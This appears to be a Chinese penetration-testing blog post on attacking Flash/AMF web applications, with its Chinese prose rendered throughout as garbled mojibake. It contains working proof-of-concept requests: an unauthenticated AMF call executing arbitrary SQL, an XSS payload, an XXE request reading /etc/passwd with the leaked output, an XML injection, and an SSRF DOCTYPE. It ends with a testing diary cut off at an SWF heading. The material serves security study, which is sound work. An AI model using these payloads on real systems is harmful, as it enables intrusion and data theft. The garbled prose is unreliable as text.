- [blazer](https://github.com/ikkisoft/blazer)ï¼šä¸€æ¬¾å…·æœ‰æ¨¡ç³Šæµ‹è¯•åŠŸèƒ½çš„è‡ªå®šä¹‰AMFæ¶ˆæ¯ç”Ÿæˆå™¨ï¼Œä½œä¸ºBurp Suiteæ’ä»¶å¯ç”¨äºŽç”Ÿæˆå’Œæ¨¡ç³Šæµ‹è¯•è‡ªå®šä¹‰AMFæ¶ˆæ¯ã€‚    *æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæ’ä»¶æ²¡æ­£å¸¸è¿è¡Œ*

MFDserç³»åˆ—æˆ‘åœ¨ä½¿ç”¨ä¸­éƒ½é‡åˆ°äº†ç›¸åŒçš„é—®é¢˜ï¼Œå³æœ‰äº›æ•°æ®åŒ… ååºåˆ—åŒ–è§£ç è¿”å›žä¸ºç©ºï¼Œå·¥å…·ä¼šå‡ºçŽ°æŠ¥å¼‚å¸¸ã€‚ç±»ä¼¼ [ç›¸å…³issue:](https://github.com/nccgroup/AMFDSer-ngng/issues/2)  

ååºåˆ—åŒ–å¹¶ç¼–ç ä¸ºxmlçš„æ•ˆæžœ



&gt; [!note]
&gt;
&gt; æ™®éè¿™äº›å·¥å…·éƒ½æ¯”è¾ƒè€ï¼ŒçŽ°åœ¨æ˜¯2025å¹´äº†ï¼ŒFlashã€AMFå¤§æ¦‚åœ¨2018å¹´æ¯”è¾ƒæµè¡Œï¼Œè¿™äº›æ’ä»¶å¯èƒ½ä¹Ÿæœ‰ä¸€äº›é€‚é…æ€§ä¸Šçš„é—®é¢˜ã€‚
&gt;
&gt; è‡³äºŽè¦ä¸è¦å¯¹è¿™äº›æ’ä»¶è¿›è¡Œä¼˜åŒ–ï¼Œå†è¯´å§â€¦â€¦(ðŸ•Šå’•å’•å’•~)



### å®žæˆ˜æ¡ˆä¾‹

é¦–å…ˆè¦ç†è§£AMFæ˜¯ä¸€ç§åºåˆ—åŒ–åŽçš„æ•°æ®ä¼ è¾“æ ¼å¼ï¼Œæ‰€ä»¥å­˜åœ¨ä»€ä¹ˆæ¼æ´žå–å†³äºŽä¼ é€’äº†ä»€ä¹ˆæ•°æ®ï¼Œå®ƒå’Œå¹³æ—¶å¸¸ç”¨çš„`key=value`æ¨¡å¼æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤å¾ˆå¤šæ¼æ´žä¹Ÿæ˜¯ç›¸è¿‘çš„ã€‚

éƒ¨åˆ†æ¡ˆä¾‹è§è¿™ç¯‡å‚è€ƒæ–‡ç« ï¼š[è°ˆè°ˆAMFç½‘ç«™çš„æ¸—é€æµ‹è¯•](https://xz.aliyun.com/news/7994)ï¼šç”¨æˆ·åæžšä¸¾ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€SQLæ³¨å…¥ã€æœªæŽˆæƒè®¿é—®ã€æ–‡ä»¶åˆ é™¤ã€‚

æŽ¥ä¸‹åŽ»æˆ‘æŒ‘ä¸€ä¸‹æˆ‘é‡åˆ°çš„æ¼æ´žï¼š

&gt; [!warning]
&gt;
&gt; *åäº†ï¼Œæˆ‘çš„æµ‹è¯•è®°å½•ä¸Šéƒ½æ˜¯æ°´å°ï¼Œç­‰æˆ‘è„±æ•ä¸‹*
&gt;
&gt; å…¶å®žå†™åˆ°è¿™çš„æ—¶å€™æ„Ÿè§‰æ²¡å•¥å¥½å†™çš„ï¼ŒAMFçš„éš¾ç‚¹å°±åœ¨å¯¹ä¼ è¾“æ•°æ®è¿›è¡Œè§£ç ï¼ŒåŽé¢çš„æ¼æ´žéƒ½æ¯”è¾ƒæ™®é€šï¼Œå’Œæ­£å¸¸Webä¸€æ ·ã€‚

#### æœªæŽˆæƒSQLæ‰§è¡Œ

è¿™ä¸ªæ¼æ´žå¾ˆå¥½ç†è§£ï¼Œç½‘ç«™å®šä¹‰äº†ä¸€ä¸ªæŽ¥å£èƒ½æ‰§è¡ŒSQLè¯­å¥ï¼ŒAMFæ•°æ®è§£ç åŽå°±å¯ä»¥ä»»æ„ä¿®æ”¹äº†ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œç›¸å½“äºŽæŽ¥ç®¡äº†SQLæ‰§è¡ŒåŠŸèƒ½ã€‚è€Œä¸”è¿™ä¸ªåŠŸèƒ½å¯ä»¥æœªæŽˆæƒè®¿é—®ï¼Œåˆ é™¤Cookieã€Tokenç­‰è®¤è¯å­—æ®µåŽä¹Ÿèƒ½èŽ·å–åˆ°æ•°æ®ã€‚

![image-20250825234246822](resource/index.assets/image-20250825234246822.png)

POC ååºåˆ—åŒ–è§£ç åŽå¦‚ä¸‹ï¼š

```xml
POST /AtomLocal/messagebroker/amf HTTP/1.1
Host: xxxxxxx
Connection: close
Content-Length: 842

&lt;ActionMessage&gt;
  &lt;version&gt;3&lt;/version&gt;
  &lt;headers/&gt;
  &lt;bodies&gt;
    &lt;MessageBody&gt;
      &lt;targetURI&gt;null&lt;/targetURI&gt;
      &lt;responseURI&gt;null&lt;/responseURI&gt;
      &lt;data class=&#34;object-array&#34;&gt;
        &lt;RemotingMessage&gt;
          &lt;destination&gt;manager&lt;/destination&gt;
          &lt;messageId&gt;BA53BCCF-2AD0-1027-D6C2-9C5702AB6F35&lt;/messageId&gt;
          &lt;timestamp&gt;0&lt;/timestamp&gt;
          &lt;timeToLive&gt;0&lt;/timeToLive&gt;
          &lt;operation&gt;searchByParam&lt;/operation&gt;
          &lt;parameters&gt;
            &lt;ASObject serialVer=&#34;1&#34; objClass=&#34;com.fsc.base.model.lookup.LookupJsonModel&#34;&gt;
              &lt;entry&gt;
                &lt;string&gt;key&lt;/string&gt;
                &lt;string&gt;select banner from v$version&lt;/string&gt;
              &lt;/entry&gt;
            &lt;/ASObject&gt;
          &lt;/parameters&gt;
        &lt;/RemotingMessage&gt;
      &lt;/data&gt;
    &lt;/MessageBody&gt;
  &lt;/bodies&gt;
&lt;/ActionMessage&gt;
```

å¯¹è¿™ä¸ªè¯·æ±‚ä½“çš„ä¸€äº›è§£é‡Šï¼š

&gt; è¿™æ®µ HTTP è¯·æ±‚åŒ…æ˜¯åŸºäºŽ**AMFï¼ˆAction Message Formatï¼‰åè®®**çš„è¿œç¨‹è°ƒç”¨æ¶ˆæ¯ï¼Œé€šå¸¸ç”¨äºŽ Flex/Flash å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ã€‚å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåºåˆ—åŒ–åŽçš„ ActionScript å¯¹è±¡ï¼Œç”¨äºŽè°ƒç”¨æœåŠ¡å™¨ç«¯çš„æ–¹æ³•å¹¶ä¼ é€’å‚æ•°ï¼Œå…·ä½“è§£æžå¦‚ä¸‹ï¼š
&gt;
&gt; ##### æ•´ä½“ç»“æž„è¯´æ˜Ž
&gt;
&gt; æ•´ä¸ªæ¶ˆæ¯ä»¥`&lt;ActionMessage&gt;`ä¸ºæ ¹èŠ‚ç‚¹ï¼Œç¬¦åˆ AMF3 åè®®çš„æ¶ˆæ¯æ ¼å¼è§„èŒƒï¼ŒåŒ…å«ç‰ˆæœ¬ä¿¡æ¯ã€æ¶ˆæ¯å¤´ã€æ¶ˆæ¯ä½“ä¸‰éƒ¨åˆ†ï¼š
&gt;
&gt; - `&lt;version&gt;3&lt;/version&gt;`ï¼šæ ‡è¯†ä½¿ç”¨ AMF3 åè®®ï¼ˆAMF æœ‰ AMF0 å’Œ AMF3 ä¸¤ä¸ªç‰ˆæœ¬ï¼Œ3 ç‰ˆæœ¬æ”¯æŒæ›´å¤šæ•°æ®ç±»åž‹ï¼‰ã€‚
&gt; - `&lt;headers/&gt;`ï¼šæ¶ˆæ¯å¤´éƒ¨åˆ†ï¼Œæ­¤å¤„ä¸ºç©ºï¼ˆå¯ç”¨äºŽä¼ é€’é™„åŠ ä¿¡æ¯å¦‚è®¤è¯ä»¤ç‰Œã€è¶…æ—¶è®¾ç½®ç­‰ï¼‰ã€‚
&gt; - `&lt;bodies&gt;`ï¼šæ¶ˆæ¯ä½“éƒ¨åˆ†ï¼ŒåŒ…å«å®žé™…çš„è¿œç¨‹è°ƒç”¨å†…å®¹ï¼ˆä¸€ä¸ªæˆ–å¤šä¸ª`&lt;MessageBody&gt;`ï¼‰ã€‚
&gt;
&gt; ##### æ ¸å¿ƒå†…å®¹è§£æžï¼ˆ`&lt;MessageBody&gt;`éƒ¨åˆ†ï¼‰
&gt;
&gt; 1. **`&lt;targetURI&gt;`å’Œ`&lt;responseURI&gt;`**
&gt;    - `targetURI`ï¼šæŒ‡å®šæœåŠ¡å™¨ç«¯çš„ç›®æ ‡å¤„ç†åœ°å€ï¼Œæ­¤å¤„ä¸º`null`ï¼ˆé€šå¸¸ç”± AMF é€šé“é…ç½®è‡ªåŠ¨å¡«å……ï¼‰ã€‚
&gt;    - `responseURI`ï¼šæŒ‡å®šæœåŠ¡å™¨è¿”å›žç»“æžœçš„å›žè°ƒåœ°å€ï¼Œæ­¤å¤„ä¸º`null`ï¼ˆå®¢æˆ·ç«¯ä¼šè‡ªåŠ¨å¤„ç†è¿”å›žç»“æžœçš„è·¯ç”±ï¼‰ã€‚
&gt; 2. **`&lt;data class=&#34;object-array&#34;&gt;`**
&gt;    åŒ…å«å®žé™…çš„è¿œç¨‹è°ƒç”¨æ¶ˆæ¯å¯¹è±¡ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ª`RemotingMessage`ï¼ˆè¿œç¨‹è°ƒç”¨æ¶ˆæ¯ï¼‰ï¼Œç”¨äºŽå®šä¹‰å…·ä½“çš„æœåŠ¡è°ƒç”¨ä¿¡æ¯ï¼š
&gt;    - `&lt;destination&gt;` ï¼šæŒ‡å®šæœåŠ¡å™¨ç«¯çš„ â€œç›®çš„åœ°â€ï¼Œ å³è¦è°ƒç”¨çš„æœåŠ¡æ ‡è¯†ï¼Œå¯¹åº”åä¸º`manager`çš„æœåŠ¡ç»„ä»¶ï¼ˆå¦‚ Spring çš„ Bean æˆ– BlazeDS çš„ Serviceï¼‰ã€‚
&gt;    - `&lt;messageId&gt;  &lt;/messageId&gt;`ï¼šæ¶ˆæ¯å”¯ä¸€æ ‡è¯†ï¼ˆUUIDï¼‰ï¼Œç”¨äºŽå®¢æˆ·ç«¯åŒ¹é…è¯·æ±‚ä¸Žè¿”å›žç»“æžœï¼ˆé¿å…å¼‚æ­¥è°ƒç”¨æ—¶çš„æ··ä¹±ï¼‰ã€‚
&gt;    - `&lt;timestamp&gt;0&lt;/timestamp&gt;` ï¼šæ¶ˆæ¯åˆ›å»ºæ—¶é—´æˆ³ï¼ˆæ­¤å¤„ä¸º`0`ï¼Œå¯èƒ½æœªè®¾ç½®ï¼‰ã€‚
&gt;    - `&lt;timeToLive&gt;0&lt;/timeToLive&gt;` ï¼šæ¶ˆæ¯æœ‰æ•ˆæœŸï¼ˆæ¯«ç§’ï¼Œ`0`è¡¨ç¤ºæ°¸ä¸è¿‡æœŸï¼‰ã€‚
&gt;    - `&lt;operation&gt;`ï¼š æŒ‡å®šè¦è°ƒç”¨çš„æœåŠ¡å™¨ç«¯æ–¹æ³•åï¼Œè¿™é‡Œæ˜¯è°ƒç”¨`manager`æœåŠ¡ä¸­çš„`searchByParam`æ–¹æ³•ã€‚
&gt;    - `&lt;parameters&gt;`ï¼šä¼ é€’ç»™`searchByParam`æ–¹æ³•çš„å‚æ•°
&gt;      æ­¤å¤„å‚æ•°æ˜¯ä¸€ä¸ª`ASObject`ï¼ˆActionScript å¯¹è±¡ï¼‰ï¼Œç±»åž‹ä¸º`com.fsc.base.model.lookup.LookupJsonModel`ï¼ŒåŒ…å«ä¸€ä¸ªé”®å€¼å¯¹ï¼š
&gt;      - `key: &#34;select username from all_users&#34;`ï¼šå³å‚æ•°å¯¹è±¡ä¸­`key`å­—æ®µçš„å€¼ä¸º SQL æŸ¥è¯¢è¯­å¥ã€‚
&gt;
&gt; ##### è¯¥è¯·æ±‚çš„å®žé™…å«ä¹‰
&gt;
&gt; å®¢æˆ·ç«¯é€šè¿‡ AMF åè®®å‘æœåŠ¡å™¨å‘é€äº†ä¸€ä¸ªè¿œç¨‹è°ƒç”¨è¯·æ±‚ï¼Œæ ¸å¿ƒæ„å›¾æ˜¯ï¼š
&gt; **è°ƒç”¨æœåŠ¡å™¨ç«¯`manager`æœåŠ¡çš„`searchByParam`æ–¹æ³•ï¼Œä¼ å…¥ä¸€ä¸ª`LookupJsonModel`å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¯¥å¯¹è±¡çš„`key`å±žæ€§å€¼ä¸º SQL è¯­å¥`select username from all_users`ã€‚**



é™¤äº†è¿™ä¸ª`manager`æœåŠ¡ä¸­çš„`searchByParam`æ–¹æ³•ï¼Œè¿˜å°è¯•Fuzzæžšä¸¾æ›´å¤šçš„æ–¹æ³•æ¥æŒ–æŽ˜æ¼æ´žï¼Œä½†æ˜¯æ²¡èƒ½æˆåŠŸï¼Œæ¯”è¾ƒå¯æƒœã€‚



#### ååºåˆ—åŒ–(CVE-2017-3066)

Adobe Flashçš„ååºåˆ—åŒ–æ¼æ´žæŒºå¤šçš„ï¼Œé‡åˆ°AMFä¼ è¾“çš„éƒ½å¯ä»¥è¯•ä¸‹å„ç§ååºåˆ—åŒ–ã€‚

è¿™ä¸ªæ¼æ´žæ˜¯åŸºäºŽ [Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executionï¼ˆCVE-2017-3066ï¼‰](https://www.exploit-db.com/exploits/43993) ï¼Œç®€å•ä¿®æ”¹ä¸‹poc å³å¯åˆ©ç”¨ï¼ŒæˆåŠŸæ”¶åˆ°RMIå›žè¿žä¿¡æ¯ï¼Œä½†æ˜¯åŽç»­å‘½ä»¤æ‰§è¡Œé‡åˆ°é—®é¢˜ã€‚

å› ä¸ºæ—¶é—´å…³ç³»ï¼Œæœ€ç»ˆä¹Ÿæ²¡å®Œå…¨åˆ©ç”¨æˆåŠŸã€‚



### åŽ†å²æ¼æ´ž

#### XSS

ä»¥ä¸‹æ¼æ´žéƒ½ä¸æ˜¯è‡ªå·±æŒ–çš„ï¼Œæ¥è‡ªç½‘ç»œï¼Œåªæ˜¯ä½œä¸ºè¡¥å……

[BMC Dashboards 7.6.01 - Cross-Site Scripting / Information Disclosure](https://www.exploit-db.com/exploits/35707)

Multiple XSS as the AMF stream is unfiltered

```http
POST /bsmdashboards/messagebroker/amfsecure HTTP/1.1
Content-Type: application/x-amf
Host: target-domain.foo
Content-Length: 462

........null../58.....    ..
.COflex.messaging.messages.RemotingMessage.timestamp.headers.operation

bodysource.remotePassword.remoteUsername.parameters.messageId.timeToLive.clientId.destination.........
#.
DSId.DSEndpoint.IFDCEEFC2-F318-1B37-7F3A-B438E60525E0..bsd-secure-amf...getUndefinedDataSources&lt;script&gt;alert(1)&lt;/script&gt;
   ..
.qcom.bmc.bsm.dashboards.services.facade.RequestParameters.
#.    name.version..208Archive..1.0...
.Cflex.messaging.io.ArrayCollection    ..
..I3DDF906B-55F2-5E38-38C1-6A08D1AC077B..........IFDDDB883-6F0C-D935-5E7B-25CDF25C3538.-dashboardArchiveFacade
```

```http
HTTP/1.1 200 OK
Date: Sat, 02 Oct 2010 00:15:35 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Content-Type: application/x-amf
Content-Length: 4651

......../58/onStatus.......
.SIflex.messaging.messages.ErrorMessage.headers.rootCause
body.correlationId.faultDetail.faultString.clientId.timeToLive.destination.timestamp.extendedData.faultCode.messageId
..
..acom.bmc.bsm.dashboards.util.logging.BSDException.message
guid!localizedMessage.cause.arguments.priority.traceback.errorCode.causeSummary.System
error. Contact your system administrator for assistance.
.Kcom.bmc.bsm.dashboards.util.guid.Guid!uniqueIdentifier.AdZZZZZZZZJIiCvq53w9q0gerq4j8y0oq.0
.s?flex.messaging.MessageException.errorMessage.&#34;$)logStackTraceEnablednumber

codelogged.statusCode..-defaultLogMessageIntro.details#preferredLogLevel&#43;rootCauseErrorMessage
.
......)Method &#39;getUndefinedDataSources&lt;script&gt;alert(1)&lt;/script&gt;&#39; not
found...1Cannot invoke method &#39;getUndefinedDataSourcesfdd4d
```

æ”»å‡»è€…æˆ–è®¸èƒ½å¤Ÿä½¿ç‚¹å‡»äº†åŸºäºŽ Remedy çŸ¥è¯†ç®¡ç†ç½‘ç«™é“¾æŽ¥çš„ç”¨æˆ·åœ¨å…¶æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„è„šæœ¬ä»£ç ã€‚æ­¤ç±»ä»£ç å°†åœ¨ç›®æ ‡åŸŸçš„å®‰å…¨çŽ¯å¢ƒå†…è¿è¡Œã€‚è¿™ç§ç±»åž‹çš„æ”»å‡»å¯èƒ½å¯¼è‡´ç›®æ ‡ç½‘ç«™çš„éžæŒä¹…æ€§ç¯¡æ”¹ï¼Œæˆ–è€…å°†æœºå¯†ä¿¡æ¯ï¼ˆå³ä¼šè¯ IDï¼‰é‡å®šå‘åˆ°æœªç»æŽˆæƒçš„ç¬¬ä¸‰æ–¹ã€‚åˆ©ç”¨æ­¤æ¼æ´žæ— éœ€è¿›è¡Œèº«ä»½éªŒè¯ã€‚

#### XXE&amp;XMLæ³¨å…¥

[Adobe (Multiple Products) - XML External Entity / XML Injection](https://www.exploit-db.com/exploits/11529)

è¿™å‡ æ¼æ´žæ˜¯http é€šé“çš„ï¼Œä¸¥æ ¼æ¥è¯´ï¼Œä¸èƒ½ç®—æ˜¯AMFä¸‹çš„æ¡ˆä¾‹ï¼Œä½†æ˜¯ç¡®å®žä¹Ÿæ˜¯ Flex æ¡†æž¶çš„ï¼Œæš‚æ—¶æ”¾è¿™å§ï¼Œæœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚

**XXE**

```xml
POST /samples/messagebroker/http HTTP/1.1
Content-type: application/x-amf

&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
&lt;!DOCTYPE test [ &lt;!ENTITY x3 SYSTEM &#34;/etc/passwd&#34;&gt; ]&gt;
&lt;amfx ver=&#34;3&#34; xmlns=&#34;http://www.macromedia.com/2005/amfx&#34;&gt;
  &lt;body&gt;
    &lt;object type=&#34;flex.messaging.messages.CommandMessage&#34;&gt;
      &lt;traits&gt;
        &lt;string&gt;body&lt;/string&gt;&lt;string&gt;clientId&lt;/string&gt;&lt;string&gt;correlationId&lt;/string&gt;
        &lt;string&gt;destination&lt;/string&gt;&lt;string&gt;headers&lt;/string&gt;&lt;string&gt;messageId&lt;/string&gt;
        &lt;string&gt;operation&lt;/string&gt;&lt;string&gt;timestamp&lt;/string&gt;&lt;string&gt;timeToLive&lt;/string&gt;
      &lt;/traits&gt;
      &lt;object&gt;&lt;traits /&gt;&lt;/object&gt;
      &lt;null /&gt;&lt;string /&gt;&lt;string /&gt;
      &lt;object&gt;
        &lt;traits&gt;
          &lt;string&gt;DSId&lt;/string&gt;&lt;string&gt;DSMessagingVersion&lt;/string&gt;
        &lt;/traits&gt;
        &lt;string&gt;nil&lt;/string&gt;&lt;int&gt;1&lt;/int&gt;
      &lt;/object&gt;
      &lt;string&gt;&amp;x3;&lt;/string&gt;
			&lt;int&gt;5&lt;/int&gt;&lt;int&gt;0&lt;/int&gt;&lt;int&gt;0&lt;/int&gt;
    &lt;/object&gt;
  &lt;/body&gt;
&lt;/amfx&gt;
```

å“åº”ä½“

```xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
&lt;amfx ver=&#34;3&#34;&gt;&lt;header name=&#34;AppendToGatewayUrl&#34; mustUnderstand=&#34;true&#34;&gt;
&lt;string&gt;;jsessionid=2191D3647221B72039C5B05D38084A42&lt;/string&gt;&lt;/header&gt;
&lt;body targetURI=&#34;/onResult&#34; responseURI=&#34;&#34;&gt;
&lt;object type=&#34;flex.messaging.messages.AcknowledgeMessage&#34;&gt;
&lt;traits&gt;&lt;string&gt;timestamp&lt;/string&gt;&lt;string&gt;headers&lt;/string&gt;
&lt;string&gt;body&lt;/string&gt;&lt;string&gt;correlationId&lt;/string&gt;
&lt;string&gt;messageId&lt;/string&gt;&lt;string&gt;timeToLive&lt;/string&gt;
&lt;string&gt;clientId&lt;/string&gt;&lt;string&gt;destination&lt;/string&gt;
&lt;/traits&gt;&lt;double&gt;1.257387140632E12&lt;/double&gt;&lt;object&gt;
&lt;traits&gt;&lt;string&gt;DSMessagingVersion&lt;/string&gt;
&lt;string&gt;DSId&lt;/string&gt;&lt;/traits&gt;&lt;double&gt;1.0&lt;/double&gt;
&lt;string&gt;BDE929FE-270D-3B56-1061-616E8B938429&lt;/string&gt;
&lt;/object&gt;&lt;null/&gt;&lt;string&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
[...]
```

**XMLæ³¨å…¥**

```http
POST /samples/messagebroker/http HTTP/1.1
Content-type: application/x-amf

&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
&lt;amfx ver=&#34;3&#34;&gt;&lt;body targetURI=&#34;&#34; responseURI=&#34;d&#34; injectedattr=&#34;anything&#34;&gt;&lt;null/&gt;
&lt;/body&gt;&lt;/amfx&gt;
```

å“åº”ä½“

```xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
&lt;amfx ver=&#34;3&#34;&gt;&lt;body targetURI=&#34;d&#34; injectedattr=&#34;anything&#34; responseURI=&#34;&#34;&gt;&lt;null/&gt;&lt;/body&gt;&lt;/amfx&gt;&lt;/body&gt;&lt;/amfx&gt;
```

#### XXE(CVE-2015-3269)

- ä¹Œäº‘è€æ–‡ç« ï¼š[AMFè§£æžé‡ä¸ŠXXEï¼ŒBurpSuiteä¹Ÿèººæžª](https://wooyun.js.org/drops/AMFè§£æžé‡ä¸ŠXXEï¼ŒBurpSuiteä¹Ÿèººæžª.html)

- [CVE-2015-3269: Apache Flex BlazeDS XXE Vulnerabilty](https://codewhitesec.blogspot.com/2015/08/cve-2015-3269-apache-flex-blazeds-xxe.html)

#### SSRF(CVE-2015-5255)

```
&lt;!DOCTYPE foo PUBLIC &#34;-//VSR//PENTEST//EN&#34;
&#34;http://49.x.y.z:8888/protected-service&#34;&gt;&lt;foo&gt;Some content&lt;/foo&gt;
```



## æˆ‘çš„æµ‹è¯•æ—¥è®°

åœ¨2025å¹´8æœˆçš„å¹³å‡¡ä¸€å¤©ï¼ŒåŽ»å®¢æˆ·çŽ°åœºè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œé‡åˆ°äº†ä¸€ä¸ªFlashç½‘ç«™ï¼Œæˆ‘æ‰“ç®—åœ¨è¿™éƒ¨åˆ†è¯´ä¸‹æˆ‘é‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚

æµ‹è¯•çŽ¯å¢ƒ

1. å†…ç½‘çŽ¯å¢ƒæµ‹è¯•ç³»ç»Ÿ
2. æµ‹è¯•æœºä¸ºWindowsï¼Œ2021ç‰ˆBurp

### FlashåŠŸèƒ½

æ‰“å¼€ç½‘ç«™ï¼Œé‡åˆ°çš„ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯èƒ½æ‰“å¼€æµ‹è¯•ç³»ç»Ÿï¼Œä½†æ˜¯åŠŸèƒ½è®¿é—®å¼‚å¸¸ï¼Œå¾ˆå¤šåŠŸèƒ½ç‚¹å‡»åŽéƒ½æ˜¯ä¸€å—ç™½å±ï¼ŒæŠ“åŒ…å‘çŽ°ç½‘ç«™ä¼šä¸‹è½½swfæ–‡ä»¶ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæµ‹è¯•è‚¯å®šæ˜¯ä¸å…¨é¢çš„ï¼Œå› æ­¤æœ€å¥½è¿˜æ˜¯èƒ½æ­£å¸¸è®¿é—®æµ‹è¯•ç³»ç»Ÿçš„æ‰€æœ‰åŠŸèƒ½ã€‚

æˆ‘æ„è¯†åˆ°è¿™æ˜¯ä¸€ä¸ªFlashç½‘ç«™ï¼ŒåŠŸèƒ½å¼‚å¸¸çš„åŽŸå› æ˜¯å½“å‰æµè§ˆå™¨ï¼ˆç”¨çš„Burpè‡ªå¸¦çš„æµè§ˆå™¨ï¼‰ä¸æ”¯æŒFlashã€‚

æŽ¥ä¸‹åŽ»å°è¯•æ›´å¥½æµè§ˆå™¨ï¼Œç¬¬ä¸€ååº”æ˜¯ç”¨IEï¼Œè°ƒç”¨IEæ‰“å¼€çš„æ˜¯Edgeï¼ˆè¢«é›†æˆäº†ï¼‰ï¼Œä½†æ˜¯ä¹Ÿä¸æ”¯æŒFlashï¼›Chromeã€Firefoxéƒ½è¯•äº†ï¼Œå½“å‰ç³»ç»Ÿçš„ç‰ˆæœ¬éƒ½ä¸æ”¯æŒFlashã€‚

ç½‘ä¸Šæ‰¾è§£å†³æ–¹æ³•ï¼Œä»¥ä¸‹æ˜¯ç”¨åˆ°çš„ä¸€äº›å·¥å…·å’Œå‘

- [å¯èƒ½æ˜¯2025å¹´ä¾ç„¶èƒ½åœ¨æµè§ˆå™¨ä¸­ä½¿ç”¨Flashçš„å¤šç§æ–¹æ³•](https://www.bilibili.com/opus/651094862871920662) ï¼Œå°è¯•äº†å…¶æåˆ°çš„æ–¹æ³•
  - [CefFlashBrowser](https://github.com/Mzying2001/CefFlashBrowser/)ï¼Œè¯„ä»·ï¼šèƒ½è¿è¡ŒFlashï¼Œä½†æ˜¯æœ‰Bugï¼Œé‡åˆ°ä¸‹è½½åŠŸèƒ½ä¼šå´©æºƒ
  - [chrome53](https://huanmvp.lanzouv.com/ii0ch0blxyqb)ï¼Œè¯„ä»·ï¼šæŒºå¥½ç”¨çš„ï¼Œæ²¡å‘çŽ°é—®é¢˜
  - å®‰è£…Flash Playerï¼Œå¹¶ä½¿ç”¨æ”¯æŒFlashçš„æµè§ˆå™¨ï¼šè¿™ä¸ªæ–¹æ¡ˆæˆ‘èµ·åˆæ˜¯æ‹’ç»çš„ï¼Œå› ä¸ºä¸æƒ³è¦å®‰è£…å¤ªå¤šä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼ŒFlash Playeråœ¨æˆ‘è¿™çš„å°è±¡ä¸æ˜¯å¾ˆå¥½ã€‚ä½†æ˜¯åŽé¢ä¸ºäº†æµ‹è¯•SWFï¼Œè¿˜æ˜¯ç”¨åˆ°äº†ã€‚

è§£å†³äº†FlashåŠŸèƒ½çš„æ­£å¸¸è®¿é—®ï¼Œé‚£å°±å¯ä»¥æ­£å¸¸æµ‹è¯•ä¸‹åŽ»äº†ã€‚

### æ­£å¸¸æµ‹è¯•

æŽ¥ä¸‹åŽ»å°±æ˜¯æ­£å¸¸æµ‹è¯•äº†ï¼Œæˆ‘æ³¨æ„åˆ°äº†ç½‘ç«™ä¼šä¸‹è½½SWFæ–‡ä»¶ï¼Œä»¥åŠè°ƒç”¨ amf æŽ¥å£è¿›è¡Œåºåˆ—åŒ–æ•°æ®çš„ä¼ è¾“ï¼Œå…³äºŽè¿™ä¸¤éƒ¨åˆ†éƒ½æ˜¯å€¼å¾—æŽ¢ç´¢çš„æµ‹è¯•ç‚¹ã€‚ä½†ç”±äºŽæ—¶é—´æœ‰é™ï¼Œè¦ä¼˜å…ˆå®Œæˆæµ‹è¯•ï¼ŒäºŽæ˜¯æˆ‘è®¡åˆ’å…ˆæµ‹æ™®é€šçš„åŠŸèƒ½ç‚¹ï¼Œåœ¨èˆ’é€‚åŒºå†…å…ˆäº§å‡ºï¼Œä¹‹åŽå†å¯¹è¿™ä¸¤è€…è¿›è¡Œæµ‹è¯•ã€‚

åœ¨è¿™éƒ¨åˆ†ï¼Œæˆ‘å°±æä¸€å˜´å‘çŽ°çš„æ¼æ´žæœ‰ï¼šç™»å½•è¿‡ç¨‹çš„ç”¨æˆ·åã€å¯†ç æžšä¸¾ï¼Œå¼±å£ä»¤ç”¨æˆ·ï¼ŒåŠŸèƒ½ç‚¹æœªæŽˆæƒè®¿é—®ã€è¶Šæƒè®¿é—®ï¼Œä»»æ„æ–‡ä»¶ä¸‹è½½ï¼ŒSQLæ³¨å…¥ã€‚

- å…¶ä¸­å°±SQLæ³¨å…¥å€¼å¾—è¯´ä¸€ä¸‹ï¼Œå®ƒæ˜¯æ¥è‡ªä¸€ä¸ªéšè—æŒºæ·±çš„åŠŸèƒ½ç‚¹ï¼Œè®¿é—®è¯¥åŠŸèƒ½ç‚¹åŽä¼šæœ‰wsdlæ–‡æ¡£ï¼Œè§£æžè¯¥æ–‡æ¡£æ‰¾åˆ°ä¸€ä¸ªæŸ¥è¯¢æŽ¥å£ï¼Œåœ¨è¯¥æŽ¥å£ä¸­å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œé€šè¿‡oracleæŠ¥é”™æ³¨å…¥æ‹¿ä¸‹ã€‚

æµ‹è¯•çš„å·®ä¸å¤šäº†ï¼Œè™½ç„¶äº§å‡ºä¹Ÿä¸é”™äº†ï¼Œä½†æ˜¯è¿˜æ˜¯å¿˜ä¸äº† SWFæ–‡ä»¶å’Œ AMFæŽ¥å£çš„äºŒè¿›åˆ¶æ•°æ®ï¼ŒæŽ¥ä¸‹åŽ»å°±æ˜¯åŽ»ç ”ç©¶é‚£ä¸¤ä¸ªäº†ã€‚

### SWF

